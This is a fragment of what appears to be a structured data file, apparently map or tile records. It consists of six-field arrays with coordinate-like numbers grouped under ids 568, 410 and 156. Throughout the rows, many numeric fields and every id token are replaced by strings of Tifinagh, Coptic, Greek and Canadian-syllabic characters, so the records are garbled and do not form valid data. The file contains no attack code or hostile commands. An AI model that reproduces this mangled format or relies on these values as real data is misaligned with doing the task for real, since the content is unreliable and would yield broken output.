			[1, ⵠ[568], ⵠⵠⵠΔ, 224, 293, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 224, 294, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], ⵠΔᐃ, 224, 295, ⵠΔΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 223, 295, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆⵠᐃ, 223, 296, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 224, 296, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 223, 297, 1],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 223, 298, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 224, 298, 1],
			[1, ⵠ[568], 2, 224, 299, ⵠΔΔ],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠΔⲆ, 223, 300, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], 1, 224, 300, ΔⲆⵠ],
			[1, ⵠ[568], 0, 223, 301, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[568], 0, 224, 302, 1],
			[1, ⵠ[568], ΔΔⵠ, 224, 304, 1],
			[1, ⵠ[568], 3, 224, 301, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 224, 303, 1],
			[ΔΔΔ, ⵠ[568], Δⵠᐃ, 221, 303, 1],
			[ᐃⲆᐃ, ⵠ[568], Δⵠᐃ, 219, 304, 1],
			[ΔΔΔ, ⵠ[568], 1, 222, 304, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠΔΔ, 222, 302, ᐃⲆᐃ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 223, 302, ΔΔΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 223, 303, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃᐃⲆ, 222, 303, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 223, 304, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆⵠᐃ, 221, 304, ⵠΔᐃ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 220, 304, 1],
			[1, ⵠ[568], 2, 220, 303, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 220, 302, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 221, 302, 1],
			[1, ⵠ[568], 2, 219, 303, ⵠΔΔ],
			[ⵠΔΔ, ⵠ[568], ᐃⵠΔ, 217, 302, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔΔⵠ, 215, 304, ΔⲆⵠ],
			[1, ⵠ[568], 0, 214, 302, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆᐃ, 218, 302, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⲆΔ, 217, 304, 1],
			[ⵠΔᐃ, ⵠ[568], ⵠΔΔ, 215, 302, ⵠΔΔ],
			[1, ⵠ[568], 2, 219, 302, ΔΔΔ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 218, 303, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 218, 304, 1],
			[1, ⵠ[568], 2, 217, 303, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 216, 304, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃᐃⲆ, 215, 303, 1],
			[ⵠΔᐃ, ⵠ[568], ΔⵠᐃⲆ, 216, 303, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 2, 216, 302, ⵠΔᐃ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 214, 303, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 214, 304, 1],
			[ΔⲆⵠ, ⵠ[568], 0, 212, 302, 1],
			[ᐃⲆᐃ, ⵠ[568], ΔⲆⲆ, 210, 303, 1],
			[1, ⵠ[568], 0, 212, 304, 1],
			[1, ⵠ[568], 0, 208, 304, 1],
			[1, ⵠ[568], ΔΔΔ, 210, 302, 1],
			[ΔⲆⵠ, ⵠ[568], Ⲇᐃⵠ, 208, 303, ⵠΔᐃ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 213, 302, 1],
			[1, ⵠ[568], 2, 213, 303, ᐃᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 213, 304, ᐃⲆᐃ],
			[ΔⲆⵠ, ⵠ[568], 2, 212, 303, ΔΔΔ],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 211, 304, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 211, 303, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 211, 302, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 209, 302, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 209, 303, ΔΔΔ],
			[1, ⵠ[568], 2, 209, 304, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 210, 304, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 208, 302, 1],
			[ⵠⲆΔ, ⵠ[568], Δⵠᐃ, 206, 303, ⵠΔΔ],
			[1, ⵠ[568], 0, 203, 304, Ⲇᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], 0, 200, 303, 1],
			[ΔΔΔ, ⵠ[568], ᐃⵠⲆ, 199, 304, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⵠⲆ, 195, 304, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⲆⲆ, 191, 303, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ⵠⲆⲆ, 193, 304, 1],
			[1, ⵠ[568], ᐃⵠⲆ, 189, 304, 1],
			[1, ⵠ[568], 1, 204, 303, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], 0, 197, 302, 1],
			[1, ⵠ[568], 0, 202, 302, ᐃⲆᐃ],
			[ΔⲆⵠ, ⵠ[568], 0, 188, 302, ⵠⲆΔ],
			[1, ⵠ[568], 0, 194, 302, Ⲇᐃⵠ],
			[1, ⵠ[568], Ⲇᐃⵠ, 197, 303, 1],
			[ΔΔΔ, ⵠ[568], 1, 201, 304, ᐃᐃⵠ],
			[1, ⵠ[568], 1, 192, 302, 1],
			[1, ⵠ[568], ΔΔΔ, 189, 303, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⲆΔ, 205, 302, 1],
			[1, ⵠ[568], 1, 188, 304, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 207, 302, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 207, 303, 1],
			[1, ⵠ[568], 2, 207, 304, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[568], ΔⵠᐃⲆ, 206, 304, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠΔⲆ, 206, 302, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 205, 303, 1],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 204, 304, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 205, 304, 1],
			[1, ⵠ[568], 2, 204, 302, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], 2, 203, 302, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 203, 303, ⵠΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 202, 303, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 201, 303, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 201, 302, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 200, 302, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 199, 302, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 198, 303, 1],
			[1, ⵠ[568], 2, 198, 302, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 199, 303, 1],
			[1, ⵠ[568], 2, 200, 304, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], 2, 202, 304, 1],
			[ⵠΔΔ, ⵠ[568], 2, 197, 304, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], 2, 198, 304, ⵠⲆΔ],
			[1, ⵠ[568], 2, 196, 304, ᐃⲆᐃ],
			[ⵠΔᐃ, ⵠ[568], 2, 196, 303, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 196, 302, ΔΔΔ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 195, 302, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆⵠᐃ, 195, 303, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 194, 303, Ⲇᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], 2, 194, 304, 1],
			[ⵠΔΔ, ⵠ[568], ⲆⲆΔᐃ, 193, 303, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 193, 302, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 192, 303, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 192, 304, ΔⲆⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 191, 304, ⵠΔΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 190, 304, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 190, 303, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 189, 302, 1],
			[Ⲇᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 190, 302, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 191, 302, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 188, 303, 1],
			[1, ⵠ[568], Δⵠᐃ, 186, 303, 1],
			[ⵠΔⲆ, ⵠ[568], 0, 183, 304, 1],
			[1, ⵠ[568], 0, 184, 302, ⵠΔⲆ],
			[1, ⵠ[568], 0, 181, 302, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], 0, 176, 302, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⵠⲆ, 178, 303, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃΔΔ, 173, 304, 1],
			[1, ⵠ[568], ΔΔⵠ, 170, 303, 1],
			[1, ⵠ[568], 0, 172, 302, 1],
			[1, ⵠ[568], 1, 182, 303, 1],
			[1, ⵠ[568], 1, 178, 304, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 175, 304, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠΔΔ, 173, 302, 1],
			[ΔⲆⵠ, ⵠ[568], Ⲇᐃⵠ, 185, 304, 1],
			[1, ⵠ[568], 1, 169, 304, 1],
			[1, ⵠ[568], 3, 187, 304, ΔⲆⵠ],
			[1, ⵠ[568], 3, 186, 304, 1],
			[1, ⵠ[568], ΔⲆΔᐃ, 187, 303, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 187, 302, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃΔᐃ, 186, 302, 1],
			[1, ⵠ[568], 3, 185, 302, ⵠΔᐃ],
			[1, ⵠ[568], 3, 185, 303, 1],
			[1, ⵠ[568], 3, 184, 303, 1],
			[ⵠΔⲆ, ⵠ[568], 3, 183, 303, Ⲇᐃⵠ],
			[1, ⵠ[568], 3, 183, 302, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[568], ΔⲆΔᐃ, 182, 302, 1],
			[1, ⵠ[568], 3, 184, 304, 1],
			[ⵠΔΔ, ⵠ[568], ⲆᐃΔᐃ, 182, 304, 1],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆΔⵠ, 181, 304, 1],
			[ΔΔΔ, ⵠ[568], 3, 179, 304, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⵠ, 180, 304, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], ᐃᐃⲆⲆ, 181, 303, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 3, 180, 303, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⵠ, 179, 303, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 180, 302, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃᐃⲆⲆ, 179, 302, ᐃⲆᐃ],
			[ⵠΔΔ, ⵠ[568], ⲆᐃΔᐃ, 178, 302, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[568], 3, 177, 302, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 177, 304, 1],
			[ᐃᐃⵠ, ⵠ[568], ⲆΔⵠⵠ, 177, 303, ⵠⲆΔ],
			[1, ⵠ[568], 3, 176, 303, 1],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠᐃ, 176, 304, ⵠΔΔ],
			[1, ⵠ[568], ⵠⵠⵠᐃ, 174, 304, 1],
			[ⵠⲆΔ, ⵠ[568], 3, 175, 303, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⵠ, 174, 303, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃᐃⲆⲆ, 173, 303, 1],
			[ᐃᐃⵠ, ⵠ[568], ΔⲆΔᐃ, 172, 303, 1],
			[ΔΔΔ, ⵠ[568], 3, 171, 303, ⵠΔᐃ],
			[1, ⵠ[568], ⲆΔⵠⵠ, 170, 304, 1],
			[ⵠΔᐃ, ⵠ[568], 3, 171, 304, Ⲇᐃⵠ],
			[1, ⵠ[568], 3, 172, 304, ⵠⲆΔ],
			[1, ⵠ[568], ⲆΔⵠⵠ, 174, 302, 1],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠⵠᐃ, 175, 302, ⵠΔΔ],
			[1, ⵠ[568], 3, 171, 302, 1],
			[Ⲇᐃⵠ, ⵠ[568], 3, 170, 302, 1],
			[ⵠΔΔ, ⵠ[568], 3, 169, 302, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⵠ, 169, 303, 1],
			[Ⲇᐃⵠ, ⵠ[568], 0, 168, 302, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⵠⲆ, 166, 303, ⵠΔⲆ],
			[Ⲇᐃⵠ, ⵠ[568], ΔΔⵠ, 163, 304, ⵠΔᐃ],
			[1, ⵠ[568], 0, 161, 302, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⵠΔ, 159, 303, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], ᐃΔΔ, 152, 304, ᐃᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], ᐃΔΔ, 155, 303, Ⲇᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 1, 164, 303, 1],
			[1, ⵠ[568], 1, 162, 303, ᐃⲆᐃ],
			[ᐃⲆᐃ, ⵠ[568], 1, 158, 304, 1],
			[ⵠⲆΔ, ⵠ[568], 1, 156, 302, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 1, 153, 302, ᐃᐃⵠ],
			[ⵠΔᐃ, ⵠ[568], 1, 154, 304, 1],
			[ⵠⲆΔ, ⵠ[568], ⲆⲆΔᐃ, 168, 304, 1],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 168, 303, ᐃⲆᐃ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 167, 303, ⵠⲆΔ],
			[ⵠΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 167, 304, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], 2, 166, 304, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 165, 304, 1],
			[1, ⵠ[568], 2, 164, 304, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 165, 303, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 167, 302, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃᐃⲆ, 166, 302, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⲆΔⲆ, 165, 302, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ΔⵠᐃⲆ, 164, 302, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], ⲆᐃᐃⲆ, 163, 302, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 162, 302, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 163, 303, 1],
			[1, ⵠ[568], 2, 162, 304, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 160, 304, 1],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 159, 304, 1],
			[1, ⵠ[568], 2, 161, 304, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 161, 303, 1],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 160, 303, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 160, 302, ⵠΔⲆ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 158, 302, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 159, 302, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 157, 302, 1],
			[1, ⵠ[568], 2, 156, 303, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 157, 303, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], 2, 158, 303, ΔΔΔ],
			[1, ⵠ[568], 2, 157, 304, 1],
			[ⵠΔΔ, ⵠ[568], 2, 156, 304, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 155, 304, ⵠΔΔ],
			[1, ⵠ[568], 2, 153, 304, 1],
			[1, ⵠ[568], 2, 153, 303, 1],
			[1, ⵠ[568], 2, 154, 303, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 154, 302, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 155, 302, 1],
			[ΔΔΔ, ⵠ[568], 2, 152, 303, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], 2, 152, 302, ΔⲆⵠ],
			[1, ⵠ[568], ᐃΔΔ, 151, 302, ⵠΔΔ],
			[1, ⵠ[568], 0, 149, 303, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ⲆΔⵠ, 145, 304, 1],
			[1, ⵠ[568], 0, 147, 302, 1],
			[ⵠⲆΔ, ⵠ[568], 0, 143, 303, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 141, 303, 1],
			[ΔΔΔ, ⵠ[568], ΔⲆⵠ, 147, 304, 1],
			[ⵠΔᐃ, ⵠ[568], 1, 145, 302, 1],
			[1, ⵠ[568], ⵠⲆΔ, 142, 302, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ΔΔΔ, 150, 304, 1],
			[1, ⵠ[568], 2, 151, 304, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], 2, 151, 303, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 150, 303, ΔΔΔ],
			[ⵠΔᐃ, ⵠ[568], ᐃⲆΔⲆ, 150, 302, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 148, 302, ⵠΔΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 146, 302, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⲆ, 144, 302, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 141, 302, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 141, 304, 1],
			[ⵠΔΔ, ⵠ[568], ᐃⲆΔⲆ, 142, 304, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 142, 303, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 143, 304, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 144, 304, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⲆΔⲆ, 144, 303, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 148, 304, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ⲆⲆΔᐃ, 148, 303, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 146, 303, ⵠΔᐃ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 145, 303, 1],
			[ΔΔΔ, ⵠ[568], 2, 147, 303, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 2, 146, 304, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 149, 304, 1],
			[1, ⵠ[568], 3, 149, 302, 1],
			[1, ⵠ[568], 3, 143, 302, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], 0, 139, 304, ⵠΔᐃ],
			[ⵠΔⲆ, ⵠ[568], 0, 138, 302, Ⲇᐃⵠ],
			[1, ⵠ[568], 1, 139, 302, ΔⲆⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 140, 302, 1],
			[1, ⵠ[568], 2, 140, 303, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 139, 303, ⵠⲆΔ],
			[ᐃᐃⵠ, ⵠ[568], ΔⵠᐃⲆ, 138, 303, 1],
			[1, ⵠ[568], 2, 138, 304, 1],
			[1, ⵠ[568], 2, 140, 304, 1],
			[1, ⵠ[568], ᐃΔΔ, 137, 304, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ΔΔⵠ, 135, 303, 1],
			[Ⲇᐃⵠ, ⵠ[568], ᐃΔΔ, 133, 304, 1],
			[1, ⵠ[568], ΔΔΔ, 135, 304, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 1, 136, 302, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 137, 302, 1],
			[1, ⵠ[568], 2, 136, 303, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 137, 303, ΔΔΔ],
			[1, ⵠ[568], 2, 136, 304, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 134, 304, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆⲆΔᐃ, 134, 303, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 133, 303, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 132, 304, ΔΔΔ],
			[1, ⵠ[568], ⲆΔⵠ, 131, 302, 1],
			[1, ⵠ[568], ᐃⵠΔ, 134, 302, 1],
			[ⵠΔⲆ, ⵠ[568], 0, 129, 304, 1],
			[1, ⵠ[568], ⵠⲆΔ, 130, 303, 1],
			[1, ⵠ[568], 1, 132, 302, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 135, 302, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 133, 302, ΔΔΔ],
			[ⵠⲆΔ, ⵠ[568], 2, 132, 303, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠⵠΔ, 131, 303, 1],
			[1, ⵠ[568], 2, 130, 304, 1],
			[1, ⵠ[568], 2, 131, 304, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], 2, 128, 304, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃᐃⲆ, 129, 303, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 130, 302, 1],
			[1, ⵠ[568], ᐃⲆΔⵠ, 127, 304, 1],
			[ⵠΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 132, 301, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 133, 301, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 134, 301, 1],
			[1, ⵠ[568], 2, 135, 301, 1],
			[1, ⵠ[568], 3, 131, 301, 1],
			[1, ⵠ[568], ⲆᐃΔᐃ, 136, 301, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], ΔⲆΔᐃ, 136, 178, ⵠⲆΔ],
			[1, ⵠ[568], 0, 136, 183, ⵠⲆΔ],
			[1, ⵠ[568], 2, 136, 182, 1],
			[ⵠΔΔ, ⵠ[568], 1, 136, 181, 1],
			[1, ⵠ[568], 0, 136, 179, 1],
			[ⵠΔΔ, ⵠ[568], ⲆΔⵠⵠ, 136, 180, 1],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 135, 183, ΔⲆⵠ],
			[1, ⵠ[568], Ⲇᐃⵠ, 135, 182, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆΔⵠⵠ, 135, 180, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⵠΔ, 134, 183, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 133, 183, ⵠΔΔ],
			[1, ⵠ[568], 3, 133, 182, 1],
			[1, ⵠ[568], Ⲇᐃⵠ, 132, 183, 1],
			[1, ⵠ[568], 3, 131, 183, 1],
			[1, ⵠ[568], 2, 135, 181, ΔⲆⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 134, 182, ⵠΔⲆ],
			[ᐃᐃⵠ, ⵠ[568], ⲆΔⵠⵠ, 134, 181, 1],
			[ⵠⲆΔ, ⵠ[410], ᐃΔΔ, 213, 301, ᐃΔΔ],
			[1, ⵠ[410], ᐃΔΔ, 204, 301, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[410], ⵠΔΔ, 196, 288, ⲆΔⵠ],
			[1, ⵠ[410], 1, 198, 283, 0],
			[ⵠΔᐃ, ⵠ[410], ΔⲆⵠ, 190, 288, ΔΔⵠ],
			[1, ⵠ[410], ⵠⲆΔ, 189, 296, ΔΔⵠ],
			[1, ⵠ[410], ΔΔΔ, 193, 293, 0],
			[ΔΔΔ, ⵠ[410], 1, 183, 292, ⵠⲆⲆ],
			[1, ⵠ[410], 1, 186, 287, ⲆΔⵠ],
			[1, ⵠ[410], 1, 190, 290, ᐃΔΔ],
			[1, ⵠ[410], ΔΔΔ, 218, 271, ᐃⵠⲆ],
			[1, ⵠ[410], ⵠⲆΔ, 220, 266, ᐃⵠⲆ],
			[1, ⵠ[410], ᐃⲆᐃ, 211, 268, ᐃⵠΔ],
			[1, ⵠ[410], 1, 210, 274, ΔΔⵠ],
			[1, ⵠ[410], ΔⲆⵠ, 205, 263, ⵠⲆⲆ],
			[ⵠⲆΔ, ⵠ[410], 1, 216, 258, 0],
			[ΔⲆⵠ, ⵠ[410], 2, 201, 294, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[410], 2, 190, 296, 0],
			[ΔⲆⵠ, ⵠ[410], 2, 188, 299, Δⵠᐃ],
			[ⵠΔᐃ, ⵠ[410], ᐃⲆΔⲆ, 186, 297, 0],
			[ⵠΔⲆ, ⵠ[410], ⲆᐃᐃⲆ, 188, 296, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[410], 2, 189, 291, ΔΔⵠ],
			[ΔΔΔ, ⵠ[410], 2, 189, 286, 0],
			[1, ⵠ[410], 2, 191, 286, 0],
			[ᐃⲆᐃ, ⵠ[410], ⲆⲆΔᐃ, 197, 286, 0],
			[ΔΔΔ, ⵠ[410], 2, 195, 290, 0],
			[1, ⵠ[410], 2, 186, 288, 0],
			[ⵠΔᐃ, ⵠ[410], 2, 184, 290, 0],
			[1, ⵠ[410], ᐃⲆⵠᐃ, 183, 293, ΔΔⵠ],
			[1, ⵠ[410], 2, 198, 286, 0],
			[1, ⵠ[410], 2, 196, 283, 0],
			[ΔΔΔ, ⵠ[410], ⵠⵠΔⲆ, 196, 281, 0],
			[ΔⲆⵠ, ⵠ[410], 2, 201, 280, Δⵠᐃ],
			[ⵠΔᐃ, ⵠ[410], ΔⵠᐃⲆ, 205, 287, ΔⲆⲆ],
			[1, ⵠ[410], 2, 209, 283, 0],
			[ΔΔΔ, ⵠ[410], 2, 212, 280, 0],
			[ΔⲆⵠ, ⵠ[410], ᐃⲆΔⲆ, 209, 277, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[410], ⵠⵠⵠΔ, 217, 278, 0],
			[ⵠΔⲆ, ⵠ[410], 2, 219, 275, 0],
			[1, ⵠ[410], 2, 220, 271, 0],
			[1, ⵠ[410], 2, 220, 267, ᐃⵠΔ],
			[1, ⵠ[410], ⲆᐃᐃⲆ, 217, 265, 0],
			[1, ⵠ[410], 2, 213, 267, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[410], 2, 208, 264, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[410], ⵠⵠⵠΔ, 206, 261, 0],
			[1, ⵠ[410], 2, 203, 265, ᐃⵠⲆ],
			[ᐃᐃⵠ, ⵠ[410], 2, 204, 270, 0],
			[1, ⵠ[410], ⵠⵠΔⲆ, 196, 267, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[410], 2, 214, 261, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[410], ᐃⲆⵠᐃ, 211, 260, 0],
			[1, ⵠ[410], 2, 218, 256, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[410], 2, 219, 262, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[410], 2, 220, 253, 0],
			[1, ⵠ[410], 2, 211, 257, 0],
			[1, ⵠ[156], 3, 198, 27, 1],
			[1, ⵠ[156], 3, 201, 30, 1],
			[1, ⵠ[156], 3, 200, 32, ᐃᐃⵠ],
			[1, ⵠ[156], 3, 198, 33, ⵠⲆΔ],
			[1, ⵠ[156], 3, 196, 33, ⵠΔⲆ],
			[ΔΔΔ, ⵠ[156], ᐃᐃⲆⲆ, 194, 32, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[156], ΔⲆΔᐃ, 194, 28, 1],
